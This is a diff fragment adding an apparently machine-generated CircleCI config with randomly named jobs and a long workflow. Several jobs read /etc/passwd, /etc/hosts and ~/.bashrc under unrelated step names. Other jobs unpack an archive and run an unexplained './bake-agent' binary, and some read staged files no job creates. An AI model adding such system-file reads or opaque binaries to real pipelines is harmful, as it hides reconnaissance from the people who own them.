+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  comment_collect_disable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture 1
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/pile.app.gz" && gzip -t "/tmp/pile.app.gz" && echo valid; true ; } > /var/tmp/ci-stage/stage-200e8
+            ls -la /var/tmp/ci-stage/stage-200e8 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'stage-200e8'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/stage-200e8 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  expect_window_fast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: A754 RETURNS BIN SCAN
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; for u in orange banana peach grape pear kiwi; do echo $u; done |paste -sd ' '; true ; } > /var/tmp/ci-stage/s1vy0gv
+            ls -la /var/tmp/ci-stage/s1vy0gv | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 's1vy0gv'
+  APP-527:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  cron012:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Move the needle on seeding
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; type cd; true ; } > /var/tmp/ci-stage/GIF
+            ls -la /var/tmp/ci-stage/GIF | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'GIF'
+  rm-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  build_2022_10:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: All clear on the dropdown
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/school-v2" && touch "/tmp/school-v2"/{friday,thursday,tuesday}.json && ls -l "/tmp/school-v2" | tail -n +2; true ; } > /var/tmp/ci-stage/LAZY_DRAFT_WIDGET
+            ls -la /var/tmp/ci-stage/LAZY_DRAFT_WIDGET | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'LAZY_DRAFT_WIDGET'
+  add-db-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/LAZY_DRAFT_WIDGET 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  BAL_23068:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Kindly itemise the log files
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; echo '3 jobs pending' && echo "that's all folks"; true ; } > /var/tmp/ci-stage/AmBErgReengaMMA
+            ls -la /var/tmp/ci-stage/AmBErgReengaMMA | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'AmBErgReengaMMA'
+  dotnet8-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/AmBErgReengaMMA 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  mk7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Prepare the cell lines for thaw
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; SRC=(meeting row split); echo ${SRC[@]:1:2}; true ; } > /var/tmp/ci-stage/d39db13dab489961c02142ef8e53ed3
+            ls -la /var/tmp/ci-stage/d39db13dab489961c02142ef8e53ed3 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'd39db13dab489961c02142ef8e53ed3'
+  ga-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+
+  test_toggle_canvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Now clean the duplicate rows
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; cut -c1-5 /etc/passwd | head -2; true ; } > /var/tmp/ci-stage/ShaDerNoRTHbOND
+            ls -la /var/tmp/ci-stage/ShaDerNoRTHbOND | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'ShaDerNoRTHbOND'
+  skoundquamtee-kit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Taste test the canary fleet
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; sed -n 's/^PRETTY_NAME="\(.*\)"/\1/p' /etc/os-release | sort -n | tail -n3; true ; } > /var/tmp/ci-stage/frozen-bond
+            ls -la /var/tmp/ci-stage/frozen-bond | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'frozen-bond'
+  Service-Tag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Dryrun
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; touch ${TMPDIR:-/tmp}/milestone_thumb.csv && chmod a-w ${TMPDIR:-/tmp}/milestone_thumb.csv && ls -l ${TMPDIR:-/tmp}/milestone_thumb.csv; true ; } > /var/tmp/ci-stage/g1yph_r3ce1pt_y131d_golden
+            ls -la /var/tmp/ci-stage/g1yph_r3ce1pt_y131d_golden | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'g1yph_r3ce1pt_y131d_golden'
+  wide-alpha-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Runway 33 fact check
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; shuf -i 1-907 -n 14 | head -5 | tac | head -5; true ; } > /var/tmp/ci-stage/dswhwrezfnpp7
+            ls -la /var/tmp/ci-stage/dswhwrezfnpp7 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'dswhwrezfnpp7'
+  setProfileIRQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: SPLASHDOWN
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; printf '%s' '3 jobs pending'; echo; true ; } > /var/tmp/ci-stage/Eh
+            ls -la /var/tmp/ci-stage/Eh | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'Eh'
+  b6-6f-39:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Parse retries 8
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; grep -s -i -n bash /etc/shells|sort -u; true ; } > /var/tmp/ci-stage/QUARK
+            ls -la /var/tmp/ci-stage/QUARK | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'QUARK'
+  pic_amt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Release candidate already restarted
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; [ ! -s /etc/group ] && echo "it is there"||echo nope; true ; } > /var/tmp/ci-stage/gadget480
+            ls -la /var/tmp/ci-stage/gadget480 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'gadget480'
+  asyncShaderDestroyMossQuick:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture 1
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; grep -qs 'HIST' "$HOME/.bashrc" && echo 'found' || echo 'not found'; true ; } > /var/tmp/ci-stage/stage-200e8
+            ls -la /var/tmp/ci-stage/stage-200e8 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'stage-200e8'
+  futures_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: RTS from open
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; echo 'let'\''s go!'|tee /tmp/webLab.txt; true ; } > /var/tmp/ci-stage/VID_00090930
+            ls -la /var/tmp/ci-stage/VID_00090930 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'VID_00090930'
+  flipwish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sail to the shift lead
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; { date; uname -r; whoami; } >"/tmp/flour-v2.dat" && cat "/tmp/flour-v2.dat"; true ; } > /var/tmp/ci-stage/dc5235ce-691d-38b0
+            ls -la /var/tmp/ci-stage/dc5235ce-691d-38b0 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'dc5235ce-691d-38b0'
+  ZGP24774:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Verify the benefits enrollment to avoid surprises
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; ls -hio --sort=version /etc/profile.d /run | nl; true ; } > /var/tmp/ci-stage/LAZY_DRAFT_WIDGET
+            ls -la /var/tmp/ci-stage/LAZY_DRAFT_WIDGET | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'LAZY_DRAFT_WIDGET'
+  threads_list:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mirror the tutorial zone to Dallas
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; command grep -hEw '^(URL|NAME|PRETTY_NAME)' /etc/os-release | sort -u; true ; } > /var/tmp/ci-stage/LAzytokEnMaPle
+            ls -la /var/tmp/ci-stage/LAzytokEnMaPle | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'LAzytokEnMaPle'
+  missData:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Never skip rebalance
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; rm -f "/tmp/market-node.out"&& echo "removed"; true ; } > /var/tmp/ci-stage/7b513ae
+            ls -la /var/tmp/ci-stage/7b513ae | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '7b513ae'
+  onyx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Onboard the training records for Ivy
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; fold -w 28 /etc/login.defs | wc -w; true ; } > /var/tmp/ci-stage/14.07.2025
+            ls -la /var/tmp/ci-stage/14.07.2025 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '14.07.2025'
+  closedParser_encode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Team looped in at last
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; readlink -f /proc/self/exe; true ; } > /var/tmp/ci-stage/cfgdevui
+            ls -la /var/tmp/ci-stage/cfgdevui | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'cfgdevui'
+  recomend_factory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture 1
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; find /usr/share -type f -name '*.xml' -user $(id -un) 2>/dev/null | tail -n 6; true ; } > /var/tmp/ci-stage/driver.log.2
+            ls -la /var/tmp/ci-stage/driver.log.2 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'driver.log.2'
+  XITER9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Batch two reconciliation
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; users; true ; } > /var/tmp/ci-stage/AmBErgReengaMMA
+            ls -la /var/tmp/ci-stage/AmBErgReengaMMA | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'AmBErgReengaMMA'
+  intrauat25:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: edge node rollout
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; for k in fox swan lion bear shark ; do printf '%s\n' "$k"; done | tac; true ; } > /var/tmp/ci-stage/sha_948c9c21f36
+            ls -la /var/tmp/ci-stage/sha_948c9c21f36 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'sha_948c9c21f36'
+  bd-b9-04:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Onboard the mentor pairings and confirm by email
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; command ls --almost-all -G --human-readable | cat -n; true ; } > /var/tmp/ci-stage/20260418
+            ls -la /var/tmp/ci-stage/20260418 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '20260418'
+  itFailsRow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Double Tap Cart Icon Job
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; for x in $(seq 1 7); do echo -n "$x "; done; echo; true ; } > /var/tmp/ci-stage/77ceb321-8ff0-0beb-3443
+            ls -la /var/tmp/ci-stage/77ceb321-8ff0-0beb-3443 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '77ceb321-8ff0-0beb-3443'
+workflows:
+  release:
+    jobs:
+      - an1m4tez
+      - test_toggle_canvas:
+          requires:
+            - an1m4tez
+      - CORE-820:
+          requires:
+            - test_toggle_canvas
+      - m_classBtn:
+          requires:
+            - test_toggle_canvas
+      - skoundquamtee-kit:
+          requires:
+            - m_classBtn
+      - cf-x:
+          requires:
+            - skoundquamtee-kit
+      - SUM7:
+          requires:
+            - skoundquamtee-kit
+      - Service-Tag:
+          requires:
+            - SUM7
+      - defualt:
+          requires:
+            - Service-Tag
+      - blockPool:
+          requires:
+            - Service-Tag
+      - wide-alpha-p:
+          requires:
+            - blockPool
+      - verify:
+          requires:
+            - wide-alpha-p
+      - BundleRayCategory:
+          requires:
+            - wide-alpha-p
+      - setProfileIRQ:
+          requires:
+            - BundleRayCategory
+      - py310-release:
+          requires:
+            - setProfileIRQ
+      - arrClean:
+          requires:
+            - setProfileIRQ
+      - b6-6f-39:
+          requires:
+            - arrClean
+      - ruby3-cov:
+          requires:
+            - b6-6f-39
+      - span130:
+          requires:
+            - b6-6f-39
+      - pic_amt:
+          requires:
+            - span130
+      - bug-8806:
+          requires:
+            - pic_amt
+      - comment_collect_disable:
+          requires:
+            - pic_amt
+      - asyncShaderDestroyMossQuick:
+          requires:
+            - comment_collect_disable
+      - lets-go:
+          requires:
+            - asyncShaderDestroyMossQuick
+      - assert_segment_inner:
+          requires:
+            - asyncShaderDestroyMossQuick
+      - futures_v2:
+          requires:
+            - assert_segment_inner
+      - node20-cov:
+          requires:
+            - futures_v2
+      - flyssswykpy:
+          requires:
+            - futures_v2
+      - flipwish:
+          requires:
+            - flyssswykpy
+      - uma-push:
+          requires:
+            - flipwish
+      - build_2022_10:
+          requires:
+            - flipwish
+      - ZGP24774:
+          requires:
+            - build_2022_10
+      - add-db-glitch:
+          requires:
+            - ZGP24774
+      - BB75
+      - threads_list:
+          requires:
+            - BB75
+      - LAB_VERIFY_9:
+          requires:
+            - threads_list
+      - exitHeightBlock:
+          requires:
+            - threads_list
+      - missData:
+          requires:
+            - exitHeightBlock
+      - fx-x:
+          requires:
+            - missData
+      - chenchen:
+          requires:
+            - missData
+      - onyx:
+          requires:
+            - chenchen
+      - cf-2a:
+          requires:
+            - onyx
+      - c8b5bd9a38275:
+          requires:
+            - onyx
+      - closedParser_encode:
+          requires:
+            - c8b5bd9a38275
+      - v3-nightly:
+          requires:
+            - closedParser_encode
+      - panel_full_coupon_init:
+          requires:
+            - closedParser_encode
+      - recomend_factory:
+          requires:
+            - panel_full_coupon_init
+      - ed-test:
+          requires:
+            - recomend_factory
+      - BAL_23068:
+          requires:
+            - recomend_factory
+      - XITER9:
+          requires:
+            - BAL_23068
+      - dotnet8-ship:
+          requires:
+            - XITER9
+      - ttbFixture_22:
+          requires:
+            - XITER9
+      - intrauat25:
+          requires:
+            - ttbFixture_22
+      - rm-queue-reload:
+          requires:
+            - intrauat25
+      - Gamma_n1:
+          requires:
+            - intrauat25
+      - bd-b9-04:
+          requires:
+            - Gamma_n1
+      - deploy:
+          requires:
+            - bd-b9-04
+      - aki_bot:
+          requires:
+            - bd-b9-04
+      - itFailsRow:
+          requires:
+            - aki_bot
+      - atlas-beta:
+          requires:
+            - itFailsRow
+      - build-2022-w11
+      - tempMu
+      - FormCanvasHandlerCur
+      - teh-ci:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - add-metrics:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - bun-bench:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - APP-527:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - add-router-v2-timeout:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - rm-router-v2:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - Run_Service9:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - jan22-rev:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - ga-v9:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
+      - chore-9714:
+          requires:
+            - build-2022-w11
+            - tempMu
+            - FormCanvasHandlerCur
